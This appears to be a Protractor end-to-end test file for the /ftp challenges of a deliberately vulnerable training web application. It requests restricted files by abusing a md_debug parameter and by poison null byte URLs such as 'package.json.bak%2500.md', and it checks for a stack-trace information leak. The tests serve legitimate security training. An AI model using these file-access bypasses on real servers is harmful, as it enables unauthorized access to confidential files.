'use strict'

describe('/ftp', function () {
  describe('challenge "confidentialDocument"', function () {
    it('should be able to access file /ftp/acquisitions.md', function () {
      browser.driver.get(browser.baseUrl + '/ftp/acquisitions.md')
    })

    protractor.expect.challengeSolved({challenge: 'Confidential Document'})
  })

  describe('challenge "errorHandling"', function () {
    it('should leak information through error message accessing /ftp/easter.egg due to wrong file suffix', function () {
      browser.driver.get(browser.baseUrl + '/ftp/easter.egg')

      browser.driver.isElementPresent(by.id('stacktrace')).then(function (present) {
        expect(present).toBe(true)
      })

      protractor.expect.challengeSolved({challenge: 'Error Handling'})
    })
  })

  describe('challenge "forgottenBackup"', function () {
    it('should be able to access file /ftp/coupons_2013.md.bak abusing md_debug parameter', function () {
      browser.driver.get(browser.baseUrl + '/ftp/coupons_2013.md.bak?md_debug=.md')
    })

    protractor.expect.challengeSolved({challenge: 'Forgotten Sales Backup'})
  })

  describe('challenge "forgottenDevBackup"', function () {
    it('should be able to access file /ftp/package.json.bak with poison null byte attack', function () {
      browser.driver.get(browser.baseUrl + '/ftp/package.json.bak%2500.md')
    })

    protractor.expect.challengeSolved({challenge: 'Forgotten Developer Backup'})
  })

  describe('challenge "easterEgg1"', function () {
    it('should be able to access file /ftp/easter.egg with poison null byte attack', function () {
      browser.driver.get(browser.baseUrl + '/ftp/eastere.gg%2500.md')
    })

    protractor.expect.challengeSolved({challenge: 'Easter Egg Tier 1'})
  })
})
